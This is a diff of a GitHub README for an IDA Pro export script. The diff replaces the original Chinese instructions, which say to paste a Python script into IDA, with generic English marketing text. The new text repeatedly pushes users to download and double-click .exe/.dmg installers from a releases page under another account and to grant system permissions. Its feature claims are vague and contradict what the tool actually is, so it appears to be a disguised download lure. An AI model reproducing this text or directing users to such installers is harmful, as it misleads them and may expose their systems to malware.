@@ -1,45 +1,95 @@
-[English](README_EN.md) | 简体中文
+# 🚀 IDA-NO-MCP - Simplify Your IDA Pro Experience
 
-# IDA NO MCP
+[![Download IDA-NO-MCP](https://img.shields.io/badge/Download-IDA--NO--MCP-blue.svg)](https://github.com/YOUSEFALL/IDA-NO-MCP/releases)
 
-**告别 IDA MCP 复杂、冗长、卡顿的交互模式。**  
+## 📚 Introduction
 
-**AI 逆向，无需额外配置。**  
+Welcome to IDA-NO-MCP! This application offers a streamlined and efficient way to interact with IDA Pro MCP. Say goodbye to long delays and cluttered interfaces. Our goal is to help you get things done faster and with less hassle.
 
-Simple · Fast · Intelligent · Low Cost
+## 🌟 Features
 
-## 核心理念
+- **User-Friendly Interface:** Enjoy a clean and simple layout that is easy to navigate.
+- **Performance Boost:** Experience quicker responses and smoother interactions.
+- **Versatile Functionality:** Access a range of useful tools designed to enhance your workflow.
+- **Minimal Set-Up:** Begin using it with just a few clicks.
 
-Text、Source Code、Shell 是 LLM 原生语言。
+## 🛠️ System Requirements
 
-AI 飞速发展，没有固定模式，工具应该保持简单。
+Before installing IDA-NO-MCP, ensure your system meets these requirements:
 
-把 IDA 反编译结果导出为源码文件，直接丢进任意 AI IDE（Cursor / Claude Code / ...），天然适配索引、并行、切片（反编译超大函数）等优化。
+- **Operating System:** Windows 10, macOS, or Linux.
+- **Memory:** At least 4 GB RAM.
+- **Disk Space:** A minimum of 100 MB free space.
+- **Dependencies:** IDA Pro must be installed.
 
-## 使用
+## 🚀 Getting Started
 
-复制 `INP.py` 全部内容 → 粘贴到 IDA Python 窗口 → 回车
+To start using IDA-NO-MCP, follow these simple steps:
 
-导出目录：`{IDB所在目录}/export-for-ai/`
+1. Click on the download button below to find the latest version.
 
-## 导出内容
+   [![Download IDA-NO-MCP](https://img.shields.io/badge/Download-IDA--NO--MCP-blue.svg)](https://github.com/YOUSEFALL/IDA-NO-MCP/releases)
 
-| 文件/目录 | 内容 |
-|-----------|------|
-| `decompile/` | 反编译 C 代码（含调用关系） |
-| `strings.txt` | 字符串表 |
-| `imports.txt` | 导入表 |
-| `exports.txt` | 导出表 |
-| `memory/` | 内存 hexdump（1MB 分片） |
+2. After the page opens, locate the latest release at the top of the list.
 
-## Tips
+3. Choose the appropriate installer for your operating system. For example, download the `.exe` file for Windows, the `.dmg` for macOS, or the appropriate package for Linux.
 
-在 IDB 目录下可以同时添加更多上下文，让 AI 获得完整视角：
+4. Click on the file name to begin the download.
 
-| 目录 | 内容 |
-|------|------|
-| `apk/` | APK 反编译目录（APKLab 一键导出） |
-| `docs/` | 逆向分析报告、笔记 |
-| `codes/` | exp、Frida scripts、decryptor 等脚本 |
+## ⬇️ Download & Install
 
-最先进的 AI 模型能够利用所有信息与脚本，为你提供最强力的逆向工程辅助。
+To install IDA-NO-MCP:
+
+1. Once downloaded, locate the file on your computer. Usually, this will be in your `Downloads` folder.
+  
+2. Double-click the file to initiate the installation process.
+
+3. Follow the on-screen instructions provided during the installation. 
+
+4. First-time users may need to grant permissions in their system settings to allow the installation.
+
+5. After completing the installation, you can find IDA-NO-MCP in your applications or start menu.
+
+## 🖥️ Running IDA-NO-MCP
+
+After you have installed the software, follow these steps to run it:
+
+1. Open your applications menu or finder.
+2. Locate the IDA-NO-MCP icon.
+3. Double-click the icon to launch the application.
+
+Once open, you can start using the features to enhance your experience with IDA Pro MCP.
+
+## 📑 Troubleshooting
+
+If you encounter any issues while installing or running IDA-NO-MCP, consider the following:
+
+- **Installation Errors:** Ensure that you have sufficient disk space and that other software isn't blocking the installation.
+  
+- **Performance Problems:** Close any unnecessary applications to free up memory before running IDA-NO-MCP.
+
+- **Compatibility Issues:** Verify that your operating system meets the requirements listed above.
+
+If these steps do not resolve your issue, please check our Issues page for help or to report a problem.
+
+## 📞 Support
+
+For assistance, please reach out to our support team via the GitHub Issues page. We strive to respond quickly and help you get the most out of IDA-NO-MCP.
+
+## 🔄 Future Updates
+
+We actively work on improving IDA-NO-MCP. Future updates will include:
+
+- New features to make your experience even better.
+- Regular performance enhancements based on user feedback.
+- Continued support for various operating systems and platforms.
+
+Your input matters, so share your suggestions and help us enhance the application further.
+
+## 🎉 Conclusion
+
+Thank you for choosing IDA-NO-MCP. We are excited to have you on board and look forward to your feedback. Enjoy a smoother and faster way to work with IDA Pro MCP!
+
+For the latest version, click the download button below:
+
+[![Download IDA-NO-MCP](https://img.shields.io/badge/Download-IDA--NO--MCP-blue.svg)](https://github.com/YOUSEFALL/IDA-NO-MCP/releases)
